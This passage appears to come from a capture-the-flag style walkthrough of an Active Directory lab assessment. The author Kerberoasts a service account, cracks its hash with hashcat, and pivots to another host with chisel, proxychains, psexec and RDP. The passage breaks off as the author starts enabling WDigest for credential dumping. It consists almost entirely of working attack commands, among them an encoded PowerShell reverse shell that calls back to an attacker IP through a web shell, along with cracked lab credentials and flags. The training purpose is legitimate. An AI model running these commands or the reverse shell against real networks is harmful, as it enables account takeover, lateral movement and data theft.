<p>Results: JusT_g3tt1ng_st@rt3d!</p>
<p><strong>Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-294-1">1</a></span>
<span class="normal"><a href="#__codelineno-294-2">2</a></span>
<span class="normal"><a href="#__codelineno-294-3">3</a></span>
<span class="normal"><a href="#__codelineno-294-4">4</a></span>
<span class="normal"><a href="#__codelineno-294-5">5</a></span>
<span class="normal"><a href="#__codelineno-294-6">6</a></span>
<span class="normal"><a href="#__codelineno-294-7">7</a></span>
<span class="normal"><a href="#__codelineno-294-8">8</a></span>
<span class="normal"><a href="#__codelineno-294-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-294-1"><a id="__codelineno-294-1" name="__codelineno-294-1"></a># Enumerate SPNs with
</span><span id="__span-294-2"><a id="__codelineno-294-2" name="__codelineno-294-2"></a>setspn.exe -Q */*
</span><span id="__span-294-3"><a id="__codelineno-294-3" name="__codelineno-294-3"></a>
</span><span id="__span-294-4"><a id="__codelineno-294-4" name="__codelineno-294-4"></a>### Results:
</span><span id="__span-294-5"><a id="__codelineno-294-5" name="__codelineno-294-5"></a># CN=svc_sql,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
</span><span id="__span-294-6"><a id="__codelineno-294-6" name="__codelineno-294-6"></a># MSSQLSvc/SQL01.inlanefreight.local:1433
</span><span id="__span-294-7"><a id="__codelineno-294-7" name="__codelineno-294-7"></a>
</span><span id="__span-294-8"><a id="__codelineno-294-8" name="__codelineno-294-8"></a># Also you can enumerate them by uploading the PowerView.ps1 the antak Choose File and Upload the file. In that case, the command line will be used to indicate the path. After that, you need to import-module every time you are going to use the cmdlet because the command line does not maintain the state. Everything runs in the context of the command.
</span><span id="__span-294-9"><a id="__codelineno-294-9" name="__codelineno-294-9"></a>cd C:/Users/Administrator/Documents ; Import-Module .\PowerView.ps1 ; Get-DomainUser * -spn | select samaccountname
</span></code></pre></div></td></tr></table></div>
<p>Results:  svc_sql</p>
<p><strong>Crack the account's password. Submit the cleartext value.</strong></p>
<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-295-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-295-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-295-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-295-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-295-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-295-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-295-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-295-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-295-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-295-10">10</a></span>
<span class="normal"><a href="#__codelineno-295-11">11</a></span>
<span class="normal"><a href="#__codelineno-295-12">12</a></span>
<span class="normal"><a href="#__codelineno-295-13">13</a></span>
<span class="normal"><a href="#__codelineno-295-14">14</a></span>
<span class="normal"><a href="#__codelineno-295-15">15</a></span>
<span class="normal"><a href="#__codelineno-295-16">16</a></span>
<span class="normal"><a href="#__codelineno-295-17">17</a></span>
<span class="normal"><a href="#__codelineno-295-18">18</a></span>
<span class="normal"><a href="#__codelineno-295-19">19</a></span>
<span class="normal"><a href="#__codelineno-295-20">20</a></span>
<span class="normal"><a href="#__codelineno-295-21">21</a></span>
<span class="normal"><a href="#__codelineno-295-22">22</a></span>
<span class="normal"><a href="#__codelineno-295-23">23</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-295-1"><a id="__codelineno-295-1" name="__codelineno-295-1"></a><span class="c"># Way 1:</span>
</span><span id="__span-295-2"><a id="__codelineno-295-2" name="__codelineno-295-2"></a><span class="c"># a)get information about domain</span>
</span><span id="__span-295-3"><a id="__codelineno-295-3" name="__codelineno-295-3"></a><span class="no">[System.DirectoryServices.ActiveDirectory.Domain]</span><span class="p">::</span><span class="n">GetCurrentDomain</span><span class="p">().</span><span class="n">DomainControllers</span>
</span><span id="__span-295-4"><a id="__codelineno-295-4" name="__codelineno-295-4"></a>
</span><span id="__span-295-5"><a id="__codelineno-295-5" name="__codelineno-295-5"></a><span class="c"># b) Obtain the ticket</span>
</span><span id="__span-295-6"><a id="__codelineno-295-6" name="__codelineno-295-6"></a><span class="nb">cd </span><span class="n">C</span><span class="p">:/</span><span class="n">Users</span><span class="p">/</span><span class="n">Administrator</span><span class="p">/</span><span class="n">Documents</span> <span class="p">;</span> <span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span> <span class="p">;</span> <span class="nb">Get-DomainSPNTicket</span> <span class="n">-SPN</span> <span class="n">MSSQLSvc</span><span class="p">/</span><span class="n">SQL01</span><span class="p">.</span><span class="n">inlanefreight</span><span class="p">.</span><span class="k">local:</span><span class="n">1433</span> <span class="n">-OutputFormat</span> <span class="n">Hashcat</span> <span class="p">|</span> <span class="nb">select </span><span class="n">-ExpandProperty</span> <span class="n">Hash</span> <span class="p">&gt;</span> <span class="n">file</span><span class="p">.</span><span class="n">txt</span> <span class="p">;</span> <span class="nb">cat </span><span class="n">file</span><span class="p">.</span><span class="n">txt</span>
</span><span id="__span-295-7"><a id="__codelineno-295-7" name="__codelineno-295-7"></a>
</span><span id="__span-295-8"><a id="__codelineno-295-8" name="__codelineno-295-8"></a><span class="c"># c) Copy ticket to the file sqlservice in my attacker machine and crack it:</span>
</span><span id="__span-295-9"><a id="__codelineno-295-9" name="__codelineno-295-9"></a><span class="n">hashcat</span> <span class="n">-m</span> <span class="n">13100</span> <span class="n">sqlserver</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">wordlists</span><span class="p">/</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span>
</span><span id="__span-295-10"><a id="__codelineno-295-10" name="__codelineno-295-10"></a>
</span><span id="__span-295-11"><a id="__codelineno-295-11" name="__codelineno-295-11"></a>
</span><span id="__span-295-12"><a id="__codelineno-295-12" name="__codelineno-295-12"></a><span class="c"># Way 2:</span>
</span><span id="__span-295-13"><a id="__codelineno-295-13" name="__codelineno-295-13"></a><span class="c"># a) get information about the system machine and the domain name</span>
</span><span id="__span-295-14"><a id="__codelineno-295-14" name="__codelineno-295-14"></a><span class="n">systeminfo</span>
</span><span id="__span-295-15"><a id="__codelineno-295-15" name="__codelineno-295-15"></a><span class="c"># b) get information about domain</span>
</span><span id="__span-295-16"><a id="__codelineno-295-16" name="__codelineno-295-16"></a><span class="no">[System.DirectoryServices.ActiveDirectory.Domain]</span><span class="p">::</span><span class="n">GetCurrentDomain</span><span class="p">().</span><span class="n">DomainControllers</span>
</span><span id="__span-295-17"><a id="__codelineno-295-17" name="__codelineno-295-17"></a><span class="c"># c) Authenticate using Kerberos with the user MSSQLSvc/SQL01.inlanefreight.local:1433.</span>
</span><span id="__span-295-18"><a id="__codelineno-295-18" name="__codelineno-295-18"></a><span class="nb">Add-Type</span> <span class="err">–</span><span class="n">AssemblyName</span> <span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span><span class="p">;</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span><span class="p">.</span><span class="n">Tokens</span><span class="p">.</span><span class="n">KerberosRequestorSecurityToken</span> <span class="err">–</span><span class="n">ArgumentList</span> <span class="err">‘</span><span class="n">MSSQLSvc</span><span class="p">/</span><span class="n">SQL01</span><span class="p">.</span><span class="n">inlanefreight</span><span class="p">.</span><span class="k">local:</span><span class="n">1433</span><span class="err">’</span>
</span><span id="__span-295-19"><a id="__codelineno-295-19" name="__codelineno-295-19"></a><span class="c"># d) Extract the generated ticket using Rubeus</span>
</span><span id="__span-295-20"><a id="__codelineno-295-20" name="__codelineno-295-20"></a><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">simple</span> <span class="p">/</span><span class="n">outfile</span><span class="p">:</span><span class="n">hashes</span><span class="p">.</span><span class="n">txt</span>
</span><span id="__span-295-21"><a id="__codelineno-295-21" name="__codelineno-295-21"></a><span class="nb">Get-Content</span> <span class="n">hashes</span><span class="p">.</span><span class="n">txt</span>
</span><span id="__span-295-22"><a id="__codelineno-295-22" name="__codelineno-295-22"></a><span class="c"># e) Crack it offline from your attacking machine</span>
</span><span id="__span-295-23"><a id="__codelineno-295-23" name="__codelineno-295-23"></a><span class="n">hashcat</span> <span class="n">-m</span> <span class="n">13100</span> <span class="n">hash</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">wordlists</span><span class="p">/</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: lucky7</p>
<p><strong>Submit the contents of the flag.txt file on the Administrator desktop on MS01</strong></p>
<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-296-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-296-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-296-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-296-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-296-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-296-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-296-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-296-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-296-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-296-10">10</a></span>
<span class="normal"><a href="#__codelineno-296-11">11</a></span>
<span class="normal"><a href="#__codelineno-296-12">12</a></span>
<span class="normal"><a href="#__codelineno-296-13">13</a></span>
<span class="normal"><a href="#__codelineno-296-14">14</a></span>
<span class="normal"><a href="#__codelineno-296-15">15</a></span>
<span class="normal"><a href="#__codelineno-296-16">16</a></span>
<span class="normal"><a href="#__codelineno-296-17">17</a></span>
<span class="normal"><a href="#__codelineno-296-18">18</a></span>
<span class="normal"><a href="#__codelineno-296-19">19</a></span>
<span class="normal"><a href="#__codelineno-296-20">20</a></span>
<span class="normal"><a href="#__codelineno-296-21">21</a></span>
<span class="normal"><a href="#__codelineno-296-22">22</a></span>
<span class="normal"><a href="#__codelineno-296-23">23</a></span>
<span class="normal"><a href="#__codelineno-296-24">24</a></span>
<span class="normal"><a href="#__codelineno-296-25">25</a></span>
<span class="normal"><a href="#__codelineno-296-26">26</a></span>
<span class="normal"><a href="#__codelineno-296-27">27</a></span>
<span class="normal"><a href="#__codelineno-296-28">28</a></span>
<span class="normal"><a href="#__codelineno-296-29">29</a></span>
<span class="normal"><a href="#__codelineno-296-30">30</a></span>
<span class="normal"><a href="#__codelineno-296-31">31</a></span>
<span class="normal"><a href="#__codelineno-296-32">32</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-296-1"><a id="__codelineno-296-1" name="__codelineno-296-1"></a><span class="c"># Way 1:</span>
</span><span id="__span-296-2"><a id="__codelineno-296-2" name="__codelineno-296-2"></a><span class="c"># a) We upload the file Microsoft.ActiveDirectory.Management.dll from the Active Directory powershell module and now we can use it to enumerate computers</span>
</span><span id="__span-296-3"><a id="__codelineno-296-3" name="__codelineno-296-3"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">ActiveDirectory</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">dll</span><span class="p">;</span> <span class="nb">Get-ADComputer</span> <span class="n">-Filter</span> <span class="p">*</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">Name</span> 
</span><span id="__span-296-4"><a id="__codelineno-296-4" name="__codelineno-296-4"></a><span class="c"># b) We need to concatenate commands with semi-colon. The following commands create a Secure-string object with the credential of the user svc_sql. Then we will use Invoke-Command to run a command in the remote host MS01</span>
</span><span id="__span-296-5"><a id="__codelineno-296-5" name="__codelineno-296-5"></a><span class="nv">$password</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s2">&quot;lucky7&quot;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">;</span> <span class="nv">$cred</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span> <span class="s2">&quot;INLANEFREIGHT\svc_sql&quot;</span><span class="p">,</span> <span class="nv">$password</span><span class="p">;</span> <span class="nb">Invoke-Command</span> <span class="n">-ComputerName</span> <span class="s2">&quot;MS01.INLANEFREIGHT.LOCAL&quot;</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="nb">Get-Content</span> <span class="s2">&quot;C:\Users\Administrator\Desktop\flag.txt&quot;</span> <span class="p">}</span>
</span><span id="__span-296-6"><a id="__codelineno-296-6" name="__codelineno-296-6"></a>
</span><span id="__span-296-7"><a id="__codelineno-296-7" name="__codelineno-296-7"></a>
</span><span id="__span-296-8"><a id="__codelineno-296-8" name="__codelineno-296-8"></a><span class="c"># Way 2:</span>
</span><span id="__span-296-9"><a id="__codelineno-296-9" name="__codelineno-296-9"></a><span class="c"># a) Upload chisel.exe:</span>
</span><span id="__span-296-10"><a id="__codelineno-296-10" name="__codelineno-296-10"></a><span class="c"># In your kali machine</span>
</span><span id="__span-296-11"><a id="__codelineno-296-11" name="__codelineno-296-11"></a><span class="n">python3</span> <span class="n">-m</span> <span class="n">http</span><span class="p">.</span><span class="n">server</span> <span class="n">8080</span>
</span><span id="__span-296-12"><a id="__codelineno-296-12" name="__codelineno-296-12"></a><span class="c"># From the anktak webapp</span>
</span><span id="__span-296-13"><a id="__codelineno-296-13" name="__codelineno-296-13"></a><span class="nb">Invoke-WebRequest</span> <span class="n">http</span><span class="p">://</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">15</span><span class="p">.</span><span class="n">140</span><span class="p">:</span><span class="n">8080</span><span class="p">/</span><span class="n">chisel</span><span class="p">.</span><span class="n">exe</span> <span class="n">-OutFile</span> <span class="n">chisel</span><span class="p">.</span><span class="n">exe</span>
</span><span id="__span-296-14"><a id="__codelineno-296-14" name="__codelineno-296-14"></a><span class="c"># b) See if we have connection to the machine MS01 and what IP is using</span>
</span><span id="__span-296-15"><a id="__codelineno-296-15" name="__codelineno-296-15"></a><span class="n">ping</span> <span class="n">MS01</span>
</span><span id="__span-296-16"><a id="__codelineno-296-16" name="__codelineno-296-16"></a><span class="c"># We obtain IP   172.16.6.50 </span>
</span><span id="__span-296-17"><a id="__codelineno-296-17" name="__codelineno-296-17"></a><span class="c"># c) We connect with nc. In a terminal of our attacking machine:</span>
</span><span id="__span-296-18"><a id="__codelineno-296-18" name="__codelineno-296-18"></a><span class="n">nc</span> <span class="n">-lnvp</span> <span class="n">1234</span>
</span><span id="__span-296-19"><a id="__codelineno-296-19" name="__codelineno-296-19"></a><span class="c"># d) In the antak terminal</span>
</span><span id="__span-296-20"><a id="__codelineno-296-20" name="__codelineno-296-20"></a><span class="n">powershell</span> <span class="n">-e</span> <span class="n">JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMQA0ADAAIgAsADEAMgAzADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA</span>
</span><span id="__span-296-21"><a id="__codelineno-296-21" name="__codelineno-296-21"></a><span class="c"># e) Now we have a connection in our kali. We will open a Chisel tunnel. For that, launch the chisel server in your kali attacking machine:</span>
</span><span id="__span-296-22"><a id="__codelineno-296-22" name="__codelineno-296-22"></a><span class="p">./</span><span class="n">chisel</span><span class="p">.</span><span class="n">exe</span> <span class="n">server</span> <span class="n">-p</span> <span class="n">8001</span> <span class="p">-</span><span class="n">-reverse</span>
</span><span id="__span-296-23"><a id="__codelineno-296-23" name="__codelineno-296-23"></a><span class="c"># f) Now in the pivot terminal that you obtained launch the .chisel.exe binary (you need to upload it before)</span>
</span><span id="__span-296-24"><a id="__codelineno-296-24" name="__codelineno-296-24"></a><span class="p">.\</span><span class="n">chisel</span><span class="p">.</span><span class="n">exe</span> <span class="n">client</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">15</span><span class="p">.</span><span class="n">140</span><span class="p">:</span><span class="n">8001</span> <span class="n">R</span><span class="p">:</span><span class="n">socks</span>
</span><span id="__span-296-25"><a id="__codelineno-296-25" name="__codelineno-296-25"></a><span class="c"># g) The connection in the kali will give you the port in which the chisel server is listening, in my case 1080. Modify your proxychains file (/etc/proxychains4.conf) last line to </span>
</span><span id="__span-296-26"><a id="__codelineno-296-26" name="__codelineno-296-26"></a><span class="n">socks5</span> <span class="n">127</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span> <span class="n">1080</span><span class="p">.</span>
</span><span id="__span-296-27"><a id="__codelineno-296-27" name="__codelineno-296-27"></a><span class="c"># h) Now we can verify that the user svc_sql has access to the machine MS01 using proxychains</span>
</span><span id="__span-296-28"><a id="__codelineno-296-28" name="__codelineno-296-28"></a><span class="n">proxychains</span> <span class="n">crackmapexec</span> <span class="n">smb</span> <span class="n">172</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">6</span><span class="p">.</span><span class="n">50</span> <span class="n">-u</span> <span class="n">svc_sql</span> <span class="n">-p</span> <span class="n">lucky7</span>
</span><span id="__span-296-29"><a id="__codelineno-296-29" name="__codelineno-296-29"></a><span class="c"># i) After confirmation, now we can a</span>
</span><span id="__span-296-30"><a id="__codelineno-296-30" name="__codelineno-296-30"></a><span class="n">proxychains</span> <span class="n">path</span><span class="p">/</span><span class="n">to</span><span class="p">/</span><span class="n">impacket</span><span class="p">/</span><span class="n">examples</span><span class="p">/</span><span class="n">psexec</span><span class="p">.</span><span class="n">py</span> <span class="n">INLANEFREIGHT</span><span class="p">.</span><span class="n">LOCAL</span><span class="p">/</span><span class="n">svc_sql</span><span class="p">:</span><span class="n">lucky7</span><span class="nv">@172</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">6</span><span class="p">.</span><span class="n">50</span>
</span><span id="__span-296-31"><a id="__codelineno-296-31" name="__codelineno-296-31"></a><span class="c"># j) and get the flag:</span>
</span><span id="__span-296-32"><a id="__codelineno-296-32" name="__codelineno-296-32"></a><span class="nb">type </span><span class="s2">&quot;C:\Users\Administrator\Desktop\flag.txt&quot;</span> 
</span></code></pre></div></td></tr></table></div>
<p>Results: spn$<em>r0ast1ng_on</em>@n_0p3n_f1re</p>
<p><strong>Find cleartext credentials for another domain user. Submit the username as your answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-297-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-297-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-297-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-297-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-297-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-297-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-297-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-297-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-297-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-297-10">10</a></span>
<span class="normal"><a href="#__codelineno-297-11">11</a></span>
<span class="normal"><a href="#__codelineno-297-12">12</a></span>
<span class="normal"><a href="#__codelineno-297-13">13</a></span>
<span class="normal"><a href="#__codelineno-297-14">14</a></span>
<span class="normal"><a href="#__codelineno-297-15">15</a></span>
<span class="normal"><a href="#__codelineno-297-16">16</a></span>
<span class="normal"><a href="#__codelineno-297-17">17</a></span>
<span class="normal"><a href="#__codelineno-297-18">18</a></span>
<span class="normal"><a href="#__codelineno-297-19">19</a></span>
<span class="normal"><a href="#__codelineno-297-20">20</a></span>
<span class="normal"><a href="#__codelineno-297-21">21</a></span>
<span class="normal"><a href="#__codelineno-297-22">22</a></span>
<span class="normal"><a href="#__codelineno-297-23">23</a></span>
<span class="normal"><a href="#__codelineno-297-24">24</a></span>
<span class="normal"><a href="#__codelineno-297-25">25</a></span>
<span class="normal"><a href="#__codelineno-297-26">26</a></span>
<span class="normal"><a href="#__codelineno-297-27">27</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-297-1"><a id="__codelineno-297-1" name="__codelineno-297-1"></a># Upload chisel.exe:
</span><span id="__span-297-2"><a id="__codelineno-297-2" name="__codelineno-297-2"></a># In your kali machine
</span><span id="__span-297-3"><a id="__codelineno-297-3" name="__codelineno-297-3"></a>python3 -m http.server 8080
</span><span id="__span-297-4"><a id="__codelineno-297-4" name="__codelineno-297-4"></a># From the anktak webapp
</span><span id="__span-297-5"><a id="__codelineno-297-5" name="__codelineno-297-5"></a>Invoke-WebRequest http://10.10.15.140:8080/chisel.exe -OutFile chisel.exe
</span><span id="__span-297-6"><a id="__codelineno-297-6" name="__codelineno-297-6"></a>
</span><span id="__span-297-7"><a id="__codelineno-297-7" name="__codelineno-297-7"></a># See if we have connection to the machine MS01 and what IP is using
</span><span id="__span-297-8"><a id="__codelineno-297-8" name="__codelineno-297-8"></a>ping MS01
</span><span id="__span-297-9"><a id="__codelineno-297-9" name="__codelineno-297-9"></a># We obtain IP   172.16.6.50 
</span><span id="__span-297-10"><a id="__codelineno-297-10" name="__codelineno-297-10"></a>
</span><span id="__span-297-11"><a id="__codelineno-297-11" name="__codelineno-297-11"></a># We connect with nc. In a terminal of our attacking machine:
</span><span id="__span-297-12"><a id="__codelineno-297-12" name="__codelineno-297-12"></a>nc -lnvp 1234
</span><span id="__span-297-13"><a id="__codelineno-297-13" name="__codelineno-297-13"></a>
</span><span id="__span-297-14"><a id="__codelineno-297-14" name="__codelineno-297-14"></a># In the antak terminal
</span><span id="__span-297-15"><a id="__codelineno-297-15" name="__codelineno-297-15"></a>powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMQA0ADAAIgAsADEAMgAzADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
</span><span id="__span-297-16"><a id="__codelineno-297-16" name="__codelineno-297-16"></a>
</span><span id="__span-297-17"><a id="__codelineno-297-17" name="__codelineno-297-17"></a># Now we have a connection in our kali. We will open a Chisel tunnel. For that, launch the chisel server in your kali attacking machine:
</span><span id="__span-297-18"><a id="__codelineno-297-18" name="__codelineno-297-18"></a>chisel server -p 8000 --reverse
</span><span id="__span-297-19"><a id="__codelineno-297-19" name="__codelineno-297-19"></a>
</span><span id="__span-297-20"><a id="__codelineno-297-20" name="__codelineno-297-20"></a># Now in the pivot terminal that you obtained launch the .chisel.exe binary (you need to upload it before)
</span><span id="__span-297-21"><a id="__codelineno-297-21" name="__codelineno-297-21"></a>.\chisel.exe client 10.10.15.140:8000 R:socks
</span><span id="__span-297-22"><a id="__codelineno-297-22" name="__codelineno-297-22"></a>
</span><span id="__span-297-23"><a id="__codelineno-297-23" name="__codelineno-297-23"></a># The connection in the kali will give you the port in which the chisel server is listening, in my case 1080. Modify your proxychains file (/etc/proxychains4.conf) last line to 
</span><span id="__span-297-24"><a id="__codelineno-297-24" name="__codelineno-297-24"></a>socks5 127.0.0.1 1080.
</span><span id="__span-297-25"><a id="__codelineno-297-25" name="__codelineno-297-25"></a>
</span><span id="__span-297-26"><a id="__codelineno-297-26" name="__codelineno-297-26"></a># Now we can enter to the MS01 machine using proxychains and the svc_sql user
</span><span id="__span-297-27"><a id="__codelineno-297-27" name="__codelineno-297-27"></a>proxychains xfreerdp /v:172.16.6.50 /u:svc_sql /cert:ignore 
</span></code></pre></div></td></tr></table></div>
<p>Now we need to enable WDigest. See this article about it: https://ivanitlearning.wordpress.com/2019/09/07/mimikatz-and-password-dumps/</p>
<p>For that, right click on Powershell and open as administrator in the target machine 172.16.6.50:</p>
<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-298-1">1</a></span>
<span class="normal"><a href="#__codelineno-298-2">2</a></span>
<span class="normal"><a href="#__codelineno-298-3">3</a></span>
<span class="normal"><a href="#__codelineno-298-4">4</a></span>
<span class="normal"><a href="#__codelineno-298-5">5</a></span>
<span class="normal"><a href="#__codelineno-298-6">6</a></span>
<span class="normal"><a href="#__codelineno-298-7">7</a></span>
<span class="normal"><a href="#__codelineno-298-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-298-1"><a id="__codelineno-298-1" name="__codelineno-298-1"></a><span class="c"># Open a Powershell terminal and Enable &quot;WDigest&quot;.</span>
